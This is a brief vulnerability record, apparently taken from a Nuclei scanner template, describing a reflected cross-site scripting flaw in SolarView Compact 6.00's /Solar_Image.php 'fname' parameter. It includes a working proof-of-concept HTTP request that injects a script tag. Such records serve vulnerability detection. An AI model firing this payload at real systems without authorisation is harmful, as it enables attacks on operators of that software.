# Vulnerability: SolarView Compact 6.00 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`solarview-compact-xss.yaml`)

## Description
SolarView Compact 6.00 contains a cross-site scripting vulnerability via fname at /Solar_Image.php.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

